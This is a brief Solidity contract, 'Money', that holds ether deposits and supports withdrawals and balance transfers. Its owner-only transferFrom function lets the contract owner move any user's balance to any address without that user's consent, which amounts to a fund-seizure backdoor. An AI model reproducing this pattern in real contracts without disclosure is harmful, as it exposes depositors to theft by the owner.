pragma solidity ^0.4.21;

import 'zeppelin-solidity/contracts/math/SafeMath.sol';
import 'zeppelin-solidity/contracts/ownership/Ownable.sol';

contract Money is Ownable{
    using SafeMath for uint256;

    mapping(address => uint256) balances;
    event Transfer(address indexed from, address indexed to, uint256 value);

    function () payable {
        balances[msg.sender] = balances[msg.sender].add(msg.value);
    }

    function withdraw () public {
        address payee = msg.sender;
        uint256 payment = balances[payee];

        require(payment != 0);
        require(address(this).balance >= payment);

        balances[payee] = 0;
        payee.transfer(payment);
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(_to != address(0));
        require(_value <= balances[msg.sender]);

        balances[msg.sender] = balances[msg.sender].sub(_value);
        balances[_to] = balances[_to].add(_value);
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) onlyOwner public {
        require(_to != address(0));
        require(_value <= balances[_from]);

        balances[_from] = balances[_from].sub(_value);
        balances[_to] = balances[_to].add(_value);
        Transfer(_from, _to, _value);
    }

    function balanceOf(address _owner) public view returns (uint256) {
        return balances[_owner];
    }

}